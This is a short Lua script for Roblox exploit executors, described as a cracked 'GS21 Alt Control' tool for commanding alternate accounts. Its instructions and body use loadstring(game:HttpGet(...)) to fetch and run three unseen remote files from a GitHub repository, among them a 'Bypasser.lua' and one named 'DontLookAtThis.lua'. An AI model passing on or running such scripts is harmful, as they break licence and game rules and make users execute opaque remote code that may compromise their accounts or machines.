--[[
Instructions:
1. Execute the loadstring below
loadstring(game:HttpGet("https://raw.githubusercontent.com/ZIuePydVbxTKTNkg/gs21K/main/KeyGetter.lua"))()

2. Paste the key into "PUT_HASH_KEY_HERE"

3. Rejoin

4. Execute this script!

5. Once you've already gotten the key you don't have to execute the script above.

-Reminder:
Make sure host is on the game first!
]]

if not game:IsLoaded() then
    game.Loaded:Wait()
end

getgenv().UrOwnKey = 'PUT_HASH_KEY_HERE'

getgenv().Host = "Host"
getgenv().Prefix = "."
getgenv().altMsg = "Thanks for using cracked GS21 Alt Control Advanced" -- Message the alts will say when .chat
getgenv().Alts = { --To add your alts use the same format | EXAMPLE: Alt3 = altId, etc etc 
    Alt1 = 123456789,
    Alt2 = 123456789,
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/ZIuePydVbxTKTNkg/gs21K/main/Bypasser.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ZIuePydVbxTKTNkg/gs21K/main/DontLookAtThis.lua"))()
